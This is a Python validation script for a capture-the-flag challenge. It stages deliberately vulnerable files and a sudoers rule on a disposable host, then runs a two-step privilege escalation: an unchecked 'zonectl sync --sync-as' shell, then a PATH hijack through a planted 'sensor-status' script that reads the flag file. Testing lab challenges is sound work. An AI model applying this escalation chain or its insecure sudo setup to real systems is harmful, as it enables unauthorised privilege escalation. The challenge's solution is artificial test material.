#!/usr/bin/env python3
"""
Local end-to-end validation for the Erebus Access Control chain — NO Docker.

Unlike a pure logic replay, this drives the REAL exploit: it stages the actual
zonectl / run-diagnostics.sh / sensor-status files from this repo onto the live
filesystem, creates the real Linux accounts (controlsvc, gh0st, y.wu,
labctl), installs the real sudoers rule, and then performs both privilege
transitions through genuine `sudo`, `setuid`, and PATH resolution — no part of
the exploit path is mocked.

MUST be run as root, and WILL create/modify system accounts and
/etc/sudoers.d/90-recovery-access-test. Only run this in a disposable
container/VM/sandbox — never on a machine whose real `y.wu`/`labctl`/
`gh0st`/`controlsvc` accounts (if any) you care about. It refuses to run if any
of those four usernames already exist, specifically to avoid clobbering a
machine that happens to have unrelated accounts with the same names.

Proves:
  * zonectl's `sync --sync-as <user> --shell` performs a real setuid + exec to
    an arbitrary existing account, with no target allowlist -- confirmed by
    landing an interactive shell as `y.wu` from `gh0st`/`controlsvc`.
  * run-diagnostics.sh's baseline behaviour (no hijack) only ever produces the
    real sensor-status's boring output -- no flag.
  * with a hijacked `sensor-status` planted in the researcher-writable
    /opt/station/modules/research_lab/toolbox/, the SAME script, invoked the SAME way, now runs the
    researcher's code as `labctl` and the flag reaches logactivity.log.
  * `researcher` cannot read the flag file directly (permission denied) --
    proving the PATH hijack is what does the escalating, not a permissions bug
    on the flag file itself.

Cleans up the accounts and sudoers file it created on the way out, even on
failure.
"""
from __future__ import annotations

import atexit
import grp
import os
import pwd
import shutil
import subprocess
import sys
import tempfile

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ROOTFS = os.path.join(REPO_ROOT, "access_control_terminal", "rootfs")

ACCOUNTS = ["controlsvc", "gh0st", "y.wu", "labctl"]
SUDOERS_PATH = "/etc/sudoers.d/90-recovery-access-test"
TEST_FLAG = "CTF{test_log_entry_and_timestamp}"

created_users: list[str] = []
staged_paths: list[str] = []


def check(name: str, cond: bool) -> None:
    print(f"  [{'PASS' if cond else 'FAIL'}] {name}")
    if not cond:
        raise SystemExit(f"FAILED: {name}")


def run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def as_user(user: str, shell_cmd: str, input_text: str | None = None, timeout: int = 10):
    """Run shell_cmd as `user` via su, optionally feeding stdin."""
    return run(["su", "-", user, "-c", shell_cmd], input=input_text, timeout=timeout)


def require_root() -> None:
    if os.geteuid() != 0:
        raise SystemExit("This test must be run as root (it manages real system accounts).")


def require_accounts_free() -> None:
    for name in ACCOUNTS:
        try:
            pwd.getpwnam(name)
        except KeyError:
            continue
        raise SystemExit(
            f"Refusing to run: account '{name}' already exists on this machine. "
            "This test is only safe on a disposable host."
        )


def cleanup() -> None:
    if os.path.exists(SUDOERS_PATH):
        os.remove(SUDOERS_PATH)
    for name in reversed(created_users):
        run(["userdel", "-r", name])
    for path in staged_paths:
        shutil.rmtree(path, ignore_errors=True)


def create_accounts() -> None:
    run(["useradd", "-m", "-s", "/bin/bash", "controlsvc"])
    run(["useradd", "-m", "-s", "/bin/bash", "gh0st"])
    run(["useradd", "-m", "-s", "/bin/bash", "y.wu"])
    run(["useradd", "-m", "-s", "/usr/sbin/nologin", "labctl"])
    created_users.extend(["controlsvc", "gh0st", "y.wu", "labctl"])
    for name in created_users:
        pwd.getpwnam(name)  # raises if creation silently failed


def stage_files() -> None:
    os.makedirs("/opt/station/modules/access_control/bin", exist_ok=True)
    os.makedirs("/opt/station/modules/access_control/data", exist_ok=True)
    os.makedirs("/opt/station/modules/access_control/logs", exist_ok=True)
    os.makedirs("/opt/station/modules/research_lab/bin", exist_ok=True)
    os.makedirs("/opt/station/modules/research_lab/toolbox", exist_ok=True)
    os.makedirs("/opt/station/modules/research_lab/logs", exist_ok=True)
    for d in ("/opt/station/modules/access_control", "/opt/station/modules/research_lab"):
        staged_paths.append(d)

    shutil.copy(os.path.join(ROOTFS, "opt/station/modules/access_control/bin/zonectl"), "/opt/station/modules/access_control/bin/zonectl")
    shutil.copy(os.path.join(ROOTFS, "opt/station/modules/access_control/data/zone_map.json"), "/opt/station/modules/access_control/data/zone_map.json")
    shutil.copy(os.path.join(ROOTFS, "opt/station/modules/research_lab/bin/run-diagnostics.sh"), "/opt/station/modules/research_lab/bin/run-diagnostics.sh")
    shutil.copy(os.path.join(ROOTFS, "opt/station/modules/research_lab/bin/sensor-status"), "/opt/station/modules/research_lab/bin/sensor-status")
    for p in ("/opt/station/modules/access_control/bin/zonectl", "/opt/station/modules/research_lab/bin/run-diagnostics.sh", "/opt/station/modules/research_lab/bin/sensor-status"):
        os.chmod(p, 0o755)

    labctl = pwd.getpwnam("labctl")
    researcher = pwd.getpwnam("y.wu")

    with open("/opt/station/modules/research_lab/logs/.mid_flag", "w") as f:
        f.write(TEST_FLAG + "\n")
    os.chown("/opt/station/modules/research_lab/logs/.mid_flag", labctl.pw_uid, labctl.pw_gid)
    os.chmod("/opt/station/modules/research_lab/logs/.mid_flag", 0o400)

    open("/opt/station/modules/research_lab/logs/logactivity.log", "w").close()
    os.chown("/opt/station/modules/research_lab/logs/logactivity.log", labctl.pw_uid, researcher.pw_gid)
    os.chmod("/opt/station/modules/research_lab/logs/logactivity.log", 0o640)

    os.chown("/opt/station/modules/research_lab/toolbox", researcher.pw_uid, researcher.pw_gid)
    os.chmod("/opt/station/modules/research_lab/toolbox", 0o755)


def install_sudoers() -> None:
    content = (
        "controlsvc ALL=(root) NOPASSWD: /opt/station/modules/access_control/bin/zonectl sync *\n"
        "gh0st ALL=(root) NOPASSWD: /opt/station/modules/access_control/bin/zonectl sync *\n"
        "y.wu ALL=(labctl) NOPASSWD: /opt/station/modules/research_lab/bin/run-diagnostics.sh\n"
    )
    fd, tmp = tempfile.mkstemp()
    with os.fdopen(fd, "w") as f:
        f.write(content)
    result = run(["visudo", "-c", "-f", tmp])
    check("sudoers fragment is syntactically valid", result.returncode == 0)
    shutil.copy(tmp, SUDOERS_PATH)
    os.chmod(SUDOERS_PATH, 0o440)
    os.remove(tmp)


def main() -> int:
    require_root()
    require_accounts_free()
    atexit.register(cleanup)

    print("Setting up accounts + sudoers...")
    create_accounts()
    stage_files()
    install_sudoers()

    print("\nStep 1 -- horizontal: gh0st -> y.wu via zonectl's unchecked sync target")
    result = as_user(
        "gh0st",
        "sudo /opt/station/modules/access_control/bin/zonectl sync --sync-as y.wu --shell",
        input_text="id -un\nexit\n",
    )
    check("zonectl sync --shell exits cleanly", result.returncode == 0)
    check("landed shell reports whoami == y.wu", "y.wu" in result.stdout)

    audit = open("/opt/station/modules/access_control/logs/zone_audit.log").read()
    check("the escalation is logged (not hidden) in zone_audit.log",
          "target=y.wu" in audit and "shell=True" in audit)

    print("\nStep 2 -- baseline: run-diagnostics.sh with no hijack only shows the real tool")
    result = as_user("y.wu", "sudo -u labctl /opt/station/modules/research_lab/bin/run-diagnostics.sh")
    check("run-diagnostics.sh (unhijacked) exits cleanly", result.returncode == 0)
    baseline_log = open("/opt/station/modules/research_lab/logs/logactivity.log").read()
    check("no flag present before the hijack", TEST_FLAG not in baseline_log)
    check("real sensor-status output present before the hijack", "self-test PASS" in baseline_log)

    print("\nStep 2b -- confirm y.wu cannot read the flag file directly")
    result = as_user("y.wu", "cat /opt/station/modules/research_lab/logs/.mid_flag")
    check("direct read of .mid_flag as y.wu is denied", result.returncode != 0)

    print("\nStep 3 -- vertical: y.wu -> labctl via the PATH hijack")
    hijack = (
        "cat > /opt/station/modules/research_lab/toolbox/sensor-status <<'EOF'\n"
        "#!/bin/sh\n"
        "cat /opt/station/modules/research_lab/logs/.mid_flag >> /opt/station/modules/research_lab/logs/logactivity.log\n"
        "EOF\n"
        "chmod +x /opt/station/modules/research_lab/toolbox/sensor-status\n"
        "sudo -u labctl /opt/station/modules/research_lab/bin/run-diagnostics.sh\n"
    )
    result = as_user("y.wu", hijack)
    check("hijacked run happens without error", result.returncode == 0)

    final_log = open("/opt/station/modules/research_lab/logs/logactivity.log").read()
    check("flag now present in logactivity.log", TEST_FLAG in final_log)
    check("logactivity.log still carries the script's own timestamped entries",
          "diagnostics run requested by" in final_log)

    print("\nAll checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
